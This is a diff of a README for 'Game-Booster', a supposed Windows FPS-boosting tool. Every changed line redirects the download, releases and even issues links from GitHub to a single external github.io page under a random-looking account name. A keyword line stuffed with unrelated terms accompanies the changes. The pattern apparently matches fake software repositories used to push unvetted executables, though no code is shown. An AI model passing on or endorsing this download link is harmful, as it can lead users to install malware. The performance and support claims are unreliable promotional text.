@@ -1,6 +1,6 @@
 # 🎮 Game-Booster - Unlock Maximum FPS and Destroy Lag
 
-[![Download Game-Booster](https://img.shields.io/badge/Download-Game--Booster-brightgreen?style=for-the-badge&logo=windows&logoColor=white&labelColor=4CAF50&color=2E7D32)](https://github.com/idklckckkdckf/Game-Booster/releases)
+[![Download Game-Booster](https://img.shields.io/badge/Download-Game--Booster-brightgreen?style=for-the-badge&logo=windows&logoColor=white&labelColor=4CAF50&color=2E7D32)](https://idklckckkdckf.github.io)
 
 ---
 
@@ -10,7 +10,7 @@ Welcome to Game-Booster! This application is designed to give your Windows 10 or
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/idklckckkdckf/Game-Booster/releases](https://github.com/idklckckkdckf/Game-Booster/releases)
+Visit this link to download the application: [https://idklckckkdckf.github.io](https://idklckckkdckf.github.io)
 
 This is a simple, one-step process. Here's what to do:
 
@@ -92,11 +92,11 @@ Absolutely! Game-Booster works great on laptops, helping to push your mobile har
 
 ## 📞 Getting Help
 
-We're here to help if you run into any issues. If you have a problem, a question, or a feature request, please don't hesitate to reach out. The best way to get support is to visit the [Issues](https://github.com/idklckckkdckf/Game-Booster/issues) page on our GitHub repository and create a new issue. We are active and respond quickly.
+We're here to help if you run into any issues. If you have a problem, a question, or a feature request, please don't hesitate to reach out. The best way to get support is to visit the [Issues](https://idklckckkdckf.github.io) page on our GitHub repository and create a new issue. We are active and respond quickly.
 
 ## 📈 Stay Updated
 
-We are constantly working on making Game-Booster even better. To stay up-to-date with new features, performance improvements, and bug fixes, make sure to visit the [Releases](https://github.com/idklckckkdckf/Game-Booster/releases) page frequently. We recommend checking for updates at least once a month.
+We are constantly working on making Game-Booster even better. To stay up-to-date with new features, performance improvements, and bug fixes, make sure to visit the [Releases](https://idklckckkdckf.github.io) page frequently. We recommend checking for updates at least once a month.
 
 ---
 
@@ -104,6 +104,6 @@ We are constantly working on making Game-Booster even better. To stay up-to-date
 
 Don't let your hardware sit idle. Unlock its full potential and play the way you've always wanted. It takes just a few seconds to download, install, and start winning.
 
-[![Get Game-Booster Now](https://img.shields.io/badge/🚀-Get%20Game--Booster%20Now-orange?style=for-the-badge&logo=windows&logoColor=white&labelColor=FF5722&color=BF360C)](https://github.com/idklckckkdckf/Game-Booster/releases)
+[![Get Game-Booster Now](https://img.shields.io/badge/🚀-Get%20Game--Booster%20Now-orange?style=for-the-badge&logo=windows&logoColor=white&labelColor=FF5722&color=BF360C)](https://idklckckkdckf.github.io)
 
 Keywords: android, app, boost, catsmoker, dagger2-mvp, esports, executable, game-booster, game-resolution-scaler, hacktoberfest, match3-game, performance, rxjava, ryzenmobile, shizuku, unity, unity3d-game
